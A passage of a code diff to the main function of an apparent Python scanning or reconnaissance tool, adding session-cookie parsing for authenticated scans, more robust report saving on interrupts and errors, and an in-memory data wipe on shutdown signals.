+        cookies = {}
+        for c in args.cookie:
+            if "=" in c:
+                k, v = c.split("=", 1)
+                cookies[k.strip()] = v.strip()
+        if cookies:
+            orch._session.set_cookies(cookies)
+            print(f"  [+] {len(cookies)} session cookie(s) set for authenticated scanning")
 
     try:
         if args.email:
@@ -3058,11 +5184,21 @@ def main():
         orch.save_report()
     except KeyboardInterrupt:
         print("\n  [!] Interrupted — saving partial results...")
-        orch.save_report()
+        try:
+            orch.save_report()
+        except Exception:
+            pass
     except Exception as e:
         print(f"\n  [!] Error: {str(e)[:80]}")
         integrity_log("intel", f"error:{str(e)[:40]}")
+        try:
+            orch.save_report()
+        except Exception:
+            pass
     finally:
+        if shutdown_requested():
+            print("  [*] Signal received — wiping in-memory data...")
+            orch.emergency_wipe()
         orch.cleanup()
         integrity_log("intel", "session_end")
 
